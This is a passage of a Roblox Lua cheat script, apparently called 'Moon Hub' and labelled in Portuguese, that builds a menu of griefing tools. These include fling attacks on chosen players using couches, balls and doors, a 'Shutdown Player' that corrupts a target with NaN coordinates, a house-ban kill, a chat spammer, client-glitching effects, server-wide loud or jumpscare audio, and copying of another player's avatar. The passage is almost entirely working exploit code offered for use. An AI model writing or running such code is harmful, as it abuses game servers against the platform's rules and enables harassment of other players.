        and not v.Parent:FindFirstChild("Head") and v.Name ~= "Handle" then
        for _, x in ipairs(v:GetChildren()) do
          if x:IsA("BodyMover") or x:IsA("RocketPropulsion") then x:Destroy() end
        end
        if v:FindFirstChild("Attachment") then v:FindFirstChild("Attachment"):Destroy() end
        if v:FindFirstChild("AlignPosition") then v:FindFirstChild("AlignPosition"):Destroy() end
        if v:FindFirstChild("Torque") then v:FindFirstChild("Torque"):Destroy() end
        v.CanCollide = false
        local t = Instance.new("Torque", v); t.Torque = Vector3.new(9e9,9e9,9e9)
        local a = Instance.new("AlignPosition", v); local at = Instance.new("Attachment", v)
        t.Attachment0 = at; a.MaxForce = 1e12; a.MaxVelocity = 1e12; a.Responsiveness = 1e12
        a.Attachment0 = at; a.Attachment1 = vx.att
      end
    end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if hrp then hrp.CFrame = CFrame.new(-308, 42, 94) end
    for _, v in ipairs(WS:GetDescendants()) do pull(v) end
    vx.conn = WS.DescendantAdded:Connect(function(v) if vx.ativo then pull(v) end end)
    local ang = 0
    vx.conn2 = R.RenderStepped:Connect(function()
      if vx.ativo then
        ang = ang + math.rad(999999)
        local c = vx.part.Position
        vx.att.WorldPosition = c + Vector3.new(math.sin(ang)*2, math.cos(ang*2), math.cos(ang)*2)
      end
    end)
  else
    if vx.conn then vx.conn:Disconnect(); vx.conn = nil end
    if vx.conn2 then vx.conn2:Disconnect(); vx.conn2 = nil end
    for _, v in ipairs(WS:GetDescendants()) do
      if v:IsA("BasePart") then
        for _, c in ipairs(v:GetChildren()) do
          if c:IsA("AlignPosition") or c:IsA("Torque") then c:Destroy() end
        end
      end
    end
  end
end
tab3:AddButton({ Name = "Vortex (Puxar Tudo)", Callback = function() if not vx.ativo then toggleVortex() end end })
tab3:AddButton({ Name = "Parar Vortex", Callback = function() if vx.ativo then toggleVortex() end end })

tab3:AddSection({ "Ficar Invisível" })
tab3:AddButton({
  Name = "Ficar Invisível",
  Callback = function()
    local args = { { 102344834840946, 70400527171038, 0, 0, 0, 0 } }
    RS:WaitForChild("Remotes"):WaitForChild("ChangeCharacterBody"):InvokeServer(unpack(args))
    RS.Remotes:WaitForChild("Wear"):InvokeServer(111858803548721)
    notify("Moon Hub", "Invisível ativado!")
  end,
})

tab3:AddSection({ "Expansão de Domínio" })
tab3:AddButton({
  Name = "Expansão de Domínio",
  Description = "Causa glitches nos clientes dos outros",
  Callback = function()
    local TCS = game:GetService("TextChatService")
    if TCS.ChatVersion == Enum.ChatVersion.TextChatService then
      pcall(function()
        TCS.TextChannels.RBXGeneral:SendAsync(string.rep("\r", 140) .. "Expansão de Domínio...")
      end)
    end
    local dom = Instance.new("Model", WS); dom.Name = "VoidZone"
    local esf = Instance.new("Part", dom)
    esf.Shape = Enum.PartType.Ball; esf.Size = Vector3.new(300,300,300)
    esf.Position = char.HumanoidRootPart.Position; esf.Anchored = true
    esf.CanCollide = false; esf.Material = Enum.Material.ForceField
    esf.Transparency = 0.3; esf.Color = Color3.fromRGB(0,0,0)
    local lz = Instance.new("PointLight", esf)
    lz.Color = Color3.fromRGB(0,153,255); lz.Brightness = 10; lz.Range = 300
    local ps = Instance.new("ParticleEmitter", esf)
    ps.Texture = "rbxassetid://243660364"; ps.Color = ColorSequence.new(Color3.fromRGB(0,153,255))
    ps.LightEmission = 1; ps.Rate = 1000; ps.Lifetime = NumberRange.new(2); ps.VelocitySpread = 180
    local sd = Instance.new("Sound", esf); sd.SoundId = "rbxassetid://1843527678"; sd.Volume = 2; sd.Looped = true; sd:Play()
    local sky = game:GetService("Lighting"):FindFirstChildOfClass("Sky")
    if sky then sky:Destroy() end
    local ns = Instance.new("Sky", game:GetService("Lighting"))
    ns.SkyboxBk = "rbxassetid://159454299"; ns.SkyboxDn = "rbxassetid://159454296"
    ns.SkyboxFt = "rbxassetid://159454293"; ns.SkyboxLf = "rbxassetid://159454286"
    ns.SkyboxRt = "rbxassetid://159454300"; ns.SkyboxUp = "rbxassetid://159454288"
    notify("Domain", "Expansão ativada!")
  end,
})

tab3:AddSection({ "Tornado" })
tab3:AddButton({
  Name = "[MUITO OP] Tornado - Navio Pirata",
  Callback = function()
    task.spawn(function()
      local TCS = game:GetService("TextChatService")
      pcall(function()
        if TCS.ChatVersion == Enum.ChatVersion.TextChatService then
          TCS.TextChannels.RBXGeneral:SendAsync("UM TORNADO SURGIU!")
        end
      end)
      local audioId = 9068077052
      for i = 1, 5 do
        pcall(function()
          RS.RE:FindFirstChild("1Gu1nSound1s"):FireServer(WS, audioId, 1)
        end)
        local s = Instance.new("Sound", char.HumanoidRootPart)
        s.SoundId = "rbxassetid://"..audioId; s:Play()
        task.wait(1.5); s:Destroy()
      end
      local rp = char.HumanoidRootPart
      local hum = char:FindFirstChildOfClass("Humanoid")
      rp.CFrame = CFrame.new(1754, -2, 58)
      task.wait(0.5)
      RS.RE["1Ca1r"]:FireServer("PickingBoat", "PirateFree")
      task.wait(1)
      local veh = WS:FindFirstChild("Vehicles")
      local pCar = veh and veh:FindFirstChild(LP.Name.."Car")
      if not pCar then return end
      local seat = pCar:FindFirstChild("Body") and pCar.Body:FindFirstChild("VehicleSeat")
      if not seat then return end
      repeat task.wait(0.1); rp.CFrame = seat.CFrame * CFrame.new(0,1,0) until hum.SeatPart == seat
      task.delay(4, function()
        if hum.SeatPart then hum.Sit = false end
        rp.CFrame = CFrame.new(0,0,0)
      end)
      task.spawn(function()
        while pCar and pCar.Parent do
          pcall(function() RS.RE:FindFirstChild("1Player1sCa1r"):FireServer("Flip") end)
          task.wait(0.5)
        end
      end)
      local wp = { Vector3.new(-16,0,-47), Vector3.new(-110,0,-45), Vector3.new(16,0,-55) }
      local ci, ni, sp, rs2, prog, rot = 1, 2, 15, math.rad(720), 0, 0
      R.Heartbeat:Connect(function(dt)
        if not (pCar and pCar.PrimaryPart) then return end
        local s = wp[ci]; local e = wp[ni]
        prog = prog + (sp*dt)/(s-e).Magnitude
        if prog >= 1 then prog=0; ci=ni; ni=(ni%#wp)+1 end
        local np = CFrame.new(s):lerp(CFrame.new(e), prog).p
        rot = rot + rs2*dt
        pCar:SetPrimaryPartCFrame(CFrame.new(np) * CFrame.Angles(0, rot, 0))
      end)
    end)
  end,
})
tab3:AddButton({
  Name = "Desativar Tornado",
  Callback = function() pcall(function() RS.RE["1Ca1r"]:FireServer("DeleteAllVehicles") end) end,
})

tab3:AddSection({ "RGB / Anti-Sit" })
local rgbOn = false
tab3:AddToggle({
  Name = "Avatar RGB (Body Color)",
  Default = false,
  Callback = function(v)
    rgbOn = v
    if v then
      task.spawn(function()
        local cores = {"Bright red","Lime green","Bright blue","Bright yellow","Bright cyan","Hot pink","Royal purple"}
        while rgbOn do
          for _, c in ipairs(cores) do
            if not rgbOn then break end
            pcall(function() RS.Remotes.ChangeBodyColor:FireServer(c) end)
            task.wait(0.5)
          end
        end
      end)
    end
  end,
})

local hairRGB = false
tab3:AddToggle({
  Name = "Cabelo RGB",
  Default = false,
  Callback = function(v)
    hairRGB = v
    if v then
      task.spawn(function()
        local cores = { Color3.new(1,1,0), Color3.new(0,0,1), Color3.new(1,0,1), Color3.new(1,1,1), Color3.new(0,1,0), Color3.new(0.5,0,1), Color3.new(1,0.647,0), Color3.new(0,1,1) }
        local i = 1
        while hairRGB do
          pcall(function() RS.RE:FindFirstChild("1Max1y"):FireServer("ChangeHairColor2", cores[i]) end)
          task.wait(0.1)
          i = i % #cores + 1
        end
      end)
    end
  end,
})

local antiSit = false
tab3:AddToggle({
  Name = "Anti Sit",
  Default = false,
  Callback = function(v)
    antiSit = v
    if v then
      task.spawn(function()
        while antiSit do
          local h = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
          if h then
            h:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
            if h.Sit then h.Sit = false end
          end
          task.wait(0.1)
        end
      end)
    end
  end,
})

-- ═══════════════════════════════════════════════════════════════════════
-- ▸ TAB 3 — Ações contra Players
-- ═══════════════════════════════════════════════════════════════════════

tab3:AddSection({ "Ações de Kill" })

local alvoSel = nil
local ddAlvo = tab3:AddDropdown({
  Name = "Selecionar Alvo",
  Description = "Alvo para os métodos",
  Options = plist(),
  Default = "",
  Callback = function(v) alvoSel = v; getgenv().Target = v end,
})
tab3:AddButton({
  Name = "Atualizar Lista",
  Callback = function() if ddAlvo then ddAlvo:Refresh(plist(), true) end end,
})

tab3:AddButton({
  Name = "Shutdown Player",
  Callback = function()
    local target = P:FindFirstChild(getgenv().Target)
    if not target or not target.Character then notify("Erro","Alvo inválido") return end
    RS.RE["1Clea1rTool1s"]:FireServer("ClearAllTools")
    RS.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
    task.wait(0.3)
    local c = LP.Backpack:WaitForChild("Couch", 3)
    if not c then return end
    c.Name = "BugCouch"
    local s1 = c:FindFirstChild("Seat1"); local s2 = c:FindFirstChild("Seat2"); local h = c:FindFirstChild("Handle")
    if s1 then s1.Disabled = true end
    if s2 then s2.Disabled = true end
    if h then h.Name = "Handle " end
    c.Parent = char
    local bv = Instance.new("BodyVelocity", s1)
    bv.MaxForce = Vector3.new(math.huge,math.huge,math.huge); bv.P = 1250; bv.Velocity = Vector3.new(0,0,0)
    repeat
      for m=1,35 do
        local tR = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
        if not tR then break end
        local pos = tR.Position + tR.Velocity/2
        s1.CFrame = CFrame.new(pos) * CFrame.new(-2,2,0)
        task.wait()
      end
      c.Parent = LP.Backpack; task.wait(); c:FindFirstChild("Handle ").Name = "Handle"
      task.wait(0.2); c.Parent = char; task.wait(); c.Parent = LP.Backpack
      c.Handle.Name = "Handle "; task.wait(0.2); c.Parent = char
    until (target.Character and target.Character.Humanoid and target.Character.Humanoid.Sit)
    task.wait()
    c.Parent = LP.Backpack
    s1.CFrame = CFrame.new(0/0, 0/0, 0/0)
    c.Parent = char; task.wait(0.1); c.Parent = LP.Backpack
    task.wait(2)
    if bv then bv:Destroy() end
    RS.RE["1Clea1rTool1s"]:FireServer("ClearAllTools")
    notify("Shutdown", "Player corrompido!")
  end,
})

tab3:AddButton({
  Name = "House Ban Kill",
  Callback = function()
    local target = P:FindFirstChild(getgenv().Target)
    if not target then notify("Erro","Alvo inválido") return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    local rp = char:FindFirstChild("HumanoidRootPart")
    local houses = WS:FindFirstChild("001_Lots")
    local veh = WS:FindFirstChild("Vehicles")
    if not (hum and rp and houses and veh) then return end
    local angles = 0
    local house = houses:FindFirstChild(LP.Name.."House")
    if not house then
      for _, lot in pairs(houses:GetChildren()) do
        if lot.Name == "For Sale" then
          for _, n in pairs(lot:GetDescendants()) do
            if n:IsA("NumberValue") and n.Name == "Number" and n.Value < 25 and n.Value > 10 then house = lot; break end
          end
        end
      end
      if house then
        local bd = house:FindFirstChild("BuyHouse")
        if bd and bd:IsA("BasePart") then
          rp.CFrame = bd.CFrame + Vector3.new(0,-6,0); task.wait(0.5)
          local cd = bd:FindFirstChild("ClickDetector"); if cd then fireclickdetector(cd) end
        end
      end
    end
    task.wait(0.5)
    local pre = houses:FindFirstChild(LP.Name.."House")
    if pre then
      local num; for _, x in pairs(pre:GetDescendants()) do if x.Name == "Number" and x:IsA("NumberValue") then num = x end end
      if num then RS.RE:FindFirstChild("1Gettin1gHous1e"):FireServer("PickingCustomHouse","049_House",num.Value) end
    end
    task.wait(0.5)
    local pCar = veh:FindFirstChild(LP.Name.."Car")
    if not pCar then
      rp.CFrame = CFrame.new(1118.81, 75.998, -1138.61); task.wait(0.5)
      RS.RE:FindFirstChild("1Ca1r"):FireServer("PickingCar","SchoolBus"); task.wait(1)
      pCar = veh:FindFirstChild(LP.Name.."Car")
    end
    if not pCar then return end
    local seat = pCar:FindFirstChild("Body") and pCar.Body:FindFirstChild("VehicleSeat")
    if seat and not hum.Sit then
      repeat task.wait(); rp.CFrame = seat.CFrame * CFrame.new(0, math.random(-1,1), 0) until hum.Sit
    end
    local th = target.Character and target.Character:FindFirstChildOfClass("Humanoid")
    local trp = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
    if not (th and trp) then return end
    while not th.Sit do
      task.wait()
      angles = angles + 100
      pCar:SetPrimaryPartCFrame(CFrame.new(trp.Position + th.MoveDirection * trp.Velocity.Magnitude / 1.10) * CFrame.Angles(math.rad(angles), 0, 0))
      pCar:SetPrimaryPartCFrame(CFrame.new(trp.Position + Vector3.new(0,-1.5,0)) * CFrame.Angles(math.rad(angles), 0, 0))
    end
    task.wait(0.2)
    local h2 = houses:FindFirstChild(LP.Name.."House")
    if h2 and h2:FindFirstChild("HouseSpawnPosition") then
      pCar:SetPrimaryPartCFrame(CFrame.new(h2.HouseSpawnPosition.Position))
    end
    task.wait(0.2)
    local reg = Region3.new(rp.Position - Vector3.new(30,30,30), rp.Position + Vector3.new(30,30,30))
    local parts = WS:FindPartsInRegion3(reg, rp, math.huge)
    for _, v in pairs(parts) do
      if v.Name == "HumanoidRootPart" then
        local b = P:FindFirstChild(v.Parent.Name)
        if b then RS.RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer("BanPlayerFromHouse", b, v.Parent) end
      end
    end
    RS.RE:FindFirstChild("1Ca1r"):FireServer("DeleteAllVehicles")
  end,
})

-- ═══════════════════════════════════════════════════════════════════════
-- ▸ TAB 3 — Click Fling
-- ═══════════════════════════════════════════════════════════════════════

tab3:AddSection({ "Click Fling" })

tab3:AddButton({
  Name = "FLING PORTA CLICK",
  Description = "Perto das portas + TOQUE no alvo",
  Callback = function()
    local W = WS; local UIS = userInputService
    local lp = LP; local lc = lp.Character or lp.CharacterAdded:Wait()
    local hrp = lc:WaitForChild("HumanoidRootPart")
    local bh = Instance.new("Part", W)
    bh.Size = Vector3.new(100000,100000,100000); bh.Transparency = 1
    bh.Anchored = true; bh.CanCollide = false; bh.Name = "AimPart"
    local ba = Instance.new("Attachment", bh); ba.Name = "BH_Att"
    R.Heartbeat:Connect(function() bh.CFrame = hrp.CFrame end)
    local doors = {}
    local function setup(part)
      if not part:IsA("BasePart") or part.Anchored or not string.find(part.Name, "Door") then return end
      if part:FindFirstChild("AttachedFlag") then return end
      part.CanCollide = false
      for _, o in ipairs(part:GetChildren()) do if o:IsA("AlignPosition") or o:IsA("Torque") or o:IsA("Attachment") then o:Destroy() end end
      local m = Instance.new("BoolValue", part); m.Name = "AttachedFlag"
      local a1 = Instance.new("Attachment", part)
      local al = Instance.new("AlignPosition", part); al.Attachment0 = a1; al.Attachment1 = ba; al.MaxForce = 1e20; al.MaxVelocity = math.huge; al.Responsiveness = 99999
      local tq = Instance.new("Torque", part); tq.Attachment0 = a1; tq.RelativeTo = Enum.ActuatorRelativeTo.World
      tq.Torque = Vector3.new(math.random(-10e5,10e5)*10000, math.random(-10e5,10e5)*10000, math.random(-10e5,10e5)*10000)
      table.insert(doors, {Part=part, Align=al})
    end
    for _, o in ipairs(W:GetDescendants()) do if o:IsA("BasePart") and string.find(o.Name,"Door") then setup(o) end end
    W.DescendantAdded:Connect(function(o) if o:IsA("BasePart") and string.find(o.Name,"Door") then setup(o) end end)
    UIS.TouchTap:Connect(function(pos, proc)
      if proc then return end
      local p = pos[1]; local cam = W.CurrentCamera
      local ray = cam:ScreenPointToRay(p.X, p.Y)
      local hit = W:Raycast(ray.Origin, ray.Direction * 1000)
      if hit and hit.Instance then
        local plr = P:GetPlayerFromCharacter(hit.Instance:FindFirstAncestorOfClass("Model"))
        if plr and plr ~= lp then
          local tC = plr.Character; if not tC then return end
          local tH = tC:FindFirstChild("HumanoidRootPart"); if not tH then return end
          local tA = tH:FindFirstChild("TargetAtt") or Instance.new("Attachment", tH)
          tA.Name = "TargetAtt"; tA.Parent = tH
          for _, d in ipairs(doors) do if d.Align then d.Align.Attachment1 = tA end end
          task.wait(5)
          for _, d in ipairs(doors) do if d.Align then d.Align.Attachment1 = ba end end
        end
      end
    end)
  end,
})

tab3:AddButton({
  Name = "FLING SOFA CLICK",
  Description = "Toque no alvo para flingar com sofá",
  Callback = function()
    local UIS = userInputService
    local eu = LP; local cam = workspaceService.CurrentCamera
    local podeClicar, equipado = true, false
    local NOME = "FxTool_A"
    local mochila = eu:WaitForChild("Backpack")
    if not mochila:FindFirstChild(NOME) then
      local tool = Instance.new("Tool"); tool.Name = NOME; tool.RequiresHandle = false; tool.CanBeDropped = false
      tool.Equipped:Connect(function() equipado = true end)
      tool.Unequipped:Connect(function() equipado = false end)
      tool.Parent = mochila
    end
    UIS.TouchTap:Connect(function(toques, proc)
      if proc or not podeClicar or not equipado then return end
      local pos = toques[1]; local raio = cam:ScreenPointToRay(pos.X, pos.Y)
      local acerto = workspaceService:Raycast(raio.Origin, raio.Direction * 1000)
      if acerto and acerto.Instance then
        local alvo = P:GetPlayerFromCharacter(acerto.Instance:FindFirstAncestorOfClass("Model"))
        if alvo and alvo ~= eu then
          podeClicar = false
          task.spawn(function()
            local raiz = eu.Character and eu.Character:FindFirstChild("HumanoidRootPart")
            local aR = alvo.Character and alvo.Character:FindFirstChild("HumanoidRootPart")
            if not (raiz and aR) then podeClicar = true; return end
            local boneco = eu.Character; local hum = boneco:FindFirstChildOfClass("Humanoid")
            local posOrig = raiz.CFrame
            RS:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllTools"); task.wait(0.2)
            RS.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch"); task.wait(0.3)
            local sofa = eu.Backpack:FindFirstChild("Couch")
            if sofa then sofa.Parent = boneco end
            task.wait(0.1)
            VIM:SendKeyEvent(true, Enum.KeyCode.F, false, game); task.wait(0.25)
            workspaceService.FallenPartsDestroyHeight = 0/0
            local forca = Instance.new("BodyVelocity", raiz)
            forca.Velocity = Vector3.new(9e8,9e8,9e8); forca.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
            hum:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
            local ang = 0
            local t0 = tick()
            while tick() - t0 < 8 and alvo.Character and alvo.Character:FindFirstChildOfClass("Humanoid") do
              local aH = alvo.Character:FindFirstChildOfClass("Humanoid")
              if aH.Sit then break end
              ang = ang + 50
              local h = alvo.Character.HumanoidRootPart
              local p = h.Position + h.Velocity / 1.5
              raiz.CFrame = CFrame.new(p) * CFrame.Angles(math.rad(ang), 0, 0)
              raiz.Velocity = Vector3.new(9e8,9e8,9e8); raiz.RotVelocity = Vector3.new(9e8,9e8,9e8)
              task.wait()
            end
            forca:Destroy(); hum:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
            hum.PlatformStand = false; raiz.CFrame = posOrig
            hum:UnequipTools()
            RS.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
          end)
          task.delay(10, function() podeClicar = true end)
        end
      end
    end)
  end,
})

tab3:AddButton({
  Name = "FLING BOLA CLICK",
  Description = "Toque no alvo para flingar com bola",
  Callback = function()
    local UIS = userInputService
    local eu = LP; local cam = workspaceService.CurrentCamera
    local NOME = "FxTool_B"; local equipado = false
    local mochila = eu:WaitForChild("Backpack")
    if not mochila:FindFirstChild(NOME) then
      local tool = Instance.new("Tool"); tool.Name = NOME; tool.RequiresHandle = false; tool.CanBeDropped = false
      tool.Equipped:Connect(function() equipado = true end)
      tool.Unequipped:Connect(function() equipado = false end)
      tool.Parent = mochila
    end
    local function FlingBall(target)
      local player = LP; local character = player.Character or player.CharacterAdded:Wait()
      local backpack = player:WaitForChild("Backpack")
      local SB = workspaceService.WorkspaceCom:WaitForChild("001_SoccerBalls")
      local function GetBall()
        if not backpack:FindFirstChild("SoccerBall") and not character:FindFirstChild("SoccerBall") then
          RS.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools","SoccerBall")
        end
        repeat task.wait() until backpack:FindFirstChild("SoccerBall") or character:FindFirstChild("SoccerBall")
        local bt = backpack:FindFirstChild("SoccerBall"); if bt then bt.Parent = character end
        repeat task.wait() until SB:FindFirstChild("Soccer"..player.Name)
        return SB:FindFirstChild("Soccer"..player.Name)
      end
      local Ball = SB:FindFirstChild("Soccer"..player.Name) or GetBall()
      Ball.CanCollide = false; Ball.Massless = true
      Ball.CustomPhysicalProperties = PhysicalProperties.new(0.0001, 0, 0)
      if target ~= player then
        local tc = target.Character
        if tc and tc:FindFirstChild("HumanoidRootPart") and tc:FindFirstChild("Humanoid") then
          local tr = tc.HumanoidRootPart; local th = tc.Humanoid
          if Ball:FindFirstChildWhichIsA("BodyVelocity") then Ball:FindFirstChildWhichIsA("BodyVelocity"):Destroy() end
          local bv = Instance.new("BodyVelocity", Ball)
          bv.Velocity = Vector3.new(9e8,9e8,9e8); bv.MaxForce = Vector3.new(math.huge,math.huge,math.huge); bv.P = 9e900
          repeat
            if tr.Velocity.Magnitude > 0 then
              Ball.CFrame = CFrame.new(tr.Position + tr.Velocity/1.5)
              Ball.Orientation = Ball.Orientation + Vector3.new(45,60,30)
            else
              for _, v in pairs(tc:GetChildren()) do
                if v:IsA("BasePart") and v.CanCollide and not v.Anchored then Ball.CFrame = v.CFrame; task.wait(1/6000) end
              end
            end
            task.wait(1/6000)
          until tr.Velocity.Magnitude > 1000 or th.Health <= 0 or not tc:IsDescendantOf(workspaceService) or target.Parent ~= P
        end
      end
    end
    UIS.TouchTap:Connect(function(toques, proc)
      if not equipado or proc then return end
      local pos = toques[1]; local raio = cam:ScreenPointToRay(pos.X, pos.Y)
      local hit = workspaceService:Raycast(raio.Origin, raio.Direction * 1000)
      if hit and hit.Instance then
        local jogador = P:GetPlayerFromCharacter(hit.Instance:FindFirstAncestorOfClass("Model"))
        if jogador and jogador ~= eu then FlingBall(jogador) end
      end
    end)
  end,
})

-- ═══════════════════════════════════════════════════════════════════════
-- ▸ TAB 4 (player) — Local Player
-- ═══════════════════════════════════════════════════════════════════════

tab4:AddSection({ "Velocidade / Pulo / Gravidade Extras" })
tab4:AddTextBox({
  Name = "Velocidade do Player",
  PlaceholderText = "16 a 1000",
  Callback = function(v)
    local s = tonumber(v); if s and char and char:FindFirstChildOfClass("Humanoid") then char.Humanoid.WalkSpeed = s end
  end,
})
tab4:AddButton({ Name = "Resetar Velocidade", Callback = function()
  if char and char:FindFirstChildOfClass("Humanoid") then char.Humanoid.WalkSpeed = 16 end
end })
tab4:AddTextBox({
  Name = "Tamanho do Pulo",
  PlaceholderText = "50 a 500",
  Callback = function(v)
    local j = tonumber(v); if j and char and char:FindFirstChildOfClass("Humanoid") then char.Humanoid.JumpPower = j end
  end,
})
tab4:AddButton({ Name = "Resetar Pulo", Callback = function()
  if char and char:FindFirstChildOfClass("Humanoid") then char.Humanoid.JumpPower = 50 end
end })
tab4:AddTextBox({
  Name = "Gravidade",
  PlaceholderText = "0 a 196.2",
  Callback = function(v) local g = tonumber(v); if g then workspaceService.Gravity = g end end,
})
tab4:AddButton({ Name = "Resetar Gravidade", Callback = function() workspaceService.Gravity = 196.2 end })

tab4:AddSection({ "Spam Chat" })
local chatText = ""
local chatDelay = 1
local spamChat = false
tab4:AddTextBox({ Name = "Mensagem", PlaceholderText = "Texto do spam", Callback = function(t) chatText = t end })
tab4:AddSlider({ Name = "Delay do Spam", Min = 0.4, Max = 10, Default = 1, Callback = function(v) chatDelay = v end })
tab4:AddToggle({
  Name = "Spam Chat",
  Default = false,
  Callback = function(v)
    spamChat = v
    if v then
      task.spawn(function()
        while spamChat do
          if chatText ~= "" then
            local TCS = TextChatService
            if TCS.ChatVersion == Enum.ChatVersion.LegacyChatService then
              pcall(function() game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents").SayMessageRequest:FireServer(chatText, "All") end)
            else
              local ch = TCS.TextChannels:FindFirstChild("RBXGeneral")
              if ch then pcall(function() ch:SendAsync(chatText) end) end
            end
          end
          task.wait(chatDelay)
        end
      end)
    end
  end,
})

tab4:AddSection({ "Head Sit" })
local hs = { conn = nil, alvo = nil }
local hsDD = tab4:AddDropdown({
  Name = "Selecionar Alvo HeadSit",
  Options = plist(),
  Default = "",
  Callback = function(v) hs.alvo = v end,
})
tab4:AddButton({ Name = "Atualizar Lista", Callback = function() if hsDD then hsDD:Refresh(plist(), true) end end })
tab4:AddToggle({
  Name = "Head Sit (Cavalhinho)",
  Default = false,
  Callback = function(v)
    if not hs.alvo then notify("Erro","Escolha um alvo"); return end
    local plr = P:FindFirstChild(hs.alvo)
    if not plr then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if v then
      hum.Sit = true
      if hs.conn then hs.conn:Disconnect() end
      hs.conn = R.Heartbeat:Connect(function()
        local tHead = plr.Character and plr.Character:FindFirstChild("Head")
        if tHead and hum.Sit then
          hrp.CFrame = tHead.CFrame * CFrame.new(0, 1.6, 0.4)
        elseif hs.conn then hs.conn:Disconnect(); hs.conn = nil; hum.Sit = false end
      end)
    else
      if hs.conn then hs.conn:Disconnect(); hs.conn = nil end
      hum.Sit = false
    end
  end,
})

-- ═══════════════════════════════════════════════════════════════════════
-- ▸ TAB 5 (avatar) — Copiar Skin
-- ═══════════════════════════════════════════════════════════════════════

tab5:AddSection({ "Copiar Skin" })
local copyTgt = nil
local copyDD = tab5:AddDropdown({
  Name = "Player para Copiar",
  Options = plist(),
  Default = "",
  Callback = function(v) copyTgt = v end,
})
tab5:AddButton({ Name = "Atualizar Lista", Callback = function() if copyDD then copyDD:Refresh(plist(), true) end end })
tab5:AddButton({
  Name = "Copiar Avatar Completo",
  Callback = function()
    if not copyTgt then return end
    local Rem = RS:WaitForChild("Remotes")
    local T = P:FindFirstChild(copyTgt)
    if not T or not T.Character then return end
    local LHum = char:FindFirstChildOfClass("Humanoid")
    local THum = T.Character:FindFirstChildOfClass("Humanoid")
    if not (LHum and THum) then return end
    local PDesc = THum:GetAppliedDescription()
    Rem.ChangeCharacterBody:InvokeServer({ PDesc.Torso, PDesc.RightArm, PDesc.LeftArm, PDesc.RightLeg, PDesc.LeftLeg, PDesc.Head })
    task.wait(0.5)
    if tonumber(PDesc.Shirt) then Rem.Wear:InvokeServer(tonumber(PDesc.Shirt)); task.wait(0.3) end
    if tonumber(PDesc.Pants) then Rem.Wear:InvokeServer(tonumber(PDesc.Pants)); task.wait(0.3) end
    if tonumber(PDesc.Face) then Rem.Wear:InvokeServer(tonumber(PDesc.Face)); task.wait(0.3) end
    for _, v in ipairs(PDesc:GetAccessories(true)) do
      if v.AssetId and tonumber(v.AssetId) then Rem.Wear:InvokeServer(tonumber(v.AssetId)); task.wait(0.3) end
    end
    local bc = T.Character:FindFirstChild("Body Colors")
    if bc then Rem.ChangeBodyColor:FireServer(tostring(bc.HeadColor)) end
  end,
})

-- ═══════════════════════════════════════════════════════════════════════
-- ▸ TAB 6 (rgb) — Nome RGB / BIO RGB
-- ═══════════════════════════════════════════════════════════════════════

tab6:AddSection({ "Nome RGB / BIO RGB" })
local nameRGB = false
local bioRGB = false
local corVib = {
  Color3.fromRGB(255,0,0), Color3.fromRGB(0,255,0), Color3.fromRGB(0,0,255),
  Color3.fromRGB(255,255,0), Color3.fromRGB(255,0,255), Color3.fromRGB(0,255,255),
  Color3.fromRGB(255,165,0), Color3.fromRGB(128,0,128), Color3.fromRGB(255,20,147),
}
tab6:AddToggle({
  Name = "Nome RGB",
  Default = false,
  Callback = function(v)
    nameRGB = v
    if v then
      task.spawn(function()
        while nameRGB do
          local c = corVib[math.random(#corVib)]
          pcall(function() RS.RE:FindFirstChild("1RPNam1eColo1r"):FireServer("PickingRPNameColor", c) end)
          task.wait(0.7)
        end
      end)
    end
  end,
})
tab6:AddToggle({
  Name = "BIO RGB",
  Default = false,
  Callback = function(v)
    bioRGB = v
    if v then
      task.spawn(function()
        while bioRGB do
          local c = corVib[math.random(#corVib)]
          pcall(function() RS.RE:FindFirstChild("1RPNam1eColo1r"):FireServer("PickingRPBioColor", c) end)
          task.wait(0.7)
        end
      end)
    end
  end,
})

-- ═══════════════════════════════════════════════════════════════════════
-- ▸ TAB music — Áudio Server
-- ═══════════════════════════════════════════════════════════════════════

tab:AddSection({ "Áudio Server" })
local audiosLst = {
  {Name="Yamete Kudasai", ID=108494476595033},
  {Name="Gritinho", ID=5710016194},
  {Name="Jumpscare Horroroso", ID=85435253347146},
  {Name="Áudio Alto", ID=6855150757},
  {Name="Ruído", ID=120034877160791},
  {Name="Jumpscare 2", ID=110637995610528},
  {Name="The Boiled One", ID=137177653817621},
  {Name="Mandrake Detected", ID=9068077052},
  {Name="Sonic.exe", ID=2496367477},
  {Name="Nuclear Siren", ID=675587093},
  {Name="Estoura tímpano", ID=268116333},
  {Name="Toma Jack", ID=132603645477541},
  {Name="Pede ifood", ID=133843750864059},
  {Name="I Ghost The down", ID=84663543883498},
  {Name="Shoope", ID=8747441609},
  {Name="Ui Que Nojo", ID=103440368630269},
  {Name="Sai dai Lava Prato", ID=101232400175829},
  {Name="Candyland - Tobu", ID=118939739460633},
}
local selAudio
tab:AddTextBox({ Name = "ID Áudio", PlaceholderText = "ID", Callback = function(v) selAudio = tonumber(v) end })
local audNames = {}
for _, a in ipairs(audiosLst) do table.insert(audNames, a.Name) end
tab:AddDropdown({
  Name = "Lista de Áudios",
  Options = audNames,
  Default = audNames[1],
  Callback = function(v)
    for _, a in ipairs(audiosLst) do if a.Name == v then selAudio = a.ID; break end end
  end,
})
tab:AddButton({
  Name = "▶ Tocar Áudio (Server)",
  Callback = function()
    if selAudio then
      pcall(function() RS.RE:FindFirstChild("1Gu1nSound1s"):FireServer(WS, selAudio, 1) end)
      local s = Instance.new("Sound", char.HumanoidRootPart)
      s.SoundId = "rbxassetid://"..selAudio; s:Play()
    end
  end,
})
local loopAudio = false
tab:AddToggle({
  Name = "Loop Áudio",
  Default = false,
